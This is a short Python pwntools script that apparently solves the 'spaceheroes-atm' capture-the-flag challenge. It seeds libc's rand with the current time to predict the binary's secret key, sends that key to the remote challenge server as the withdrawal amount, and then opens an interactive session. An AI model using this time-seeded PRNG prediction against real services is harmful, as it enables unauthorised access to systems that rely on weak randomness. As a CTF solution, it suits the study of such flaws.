from pwn import *
from ctypes import *

c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#p = process("./atm.bin")
p = remote("spaceheroes-atm.chals.io", 443, ssl=True, sni="spaceheroes-atm.chals.io")

c.srand(c.time(0))
random_key = c.rand()

p.recvuntil(b"Option: \n")
p.sendline(b"w")

p.recvuntil(b"Amount")
p.sendline(str(random_key))
p.interactive()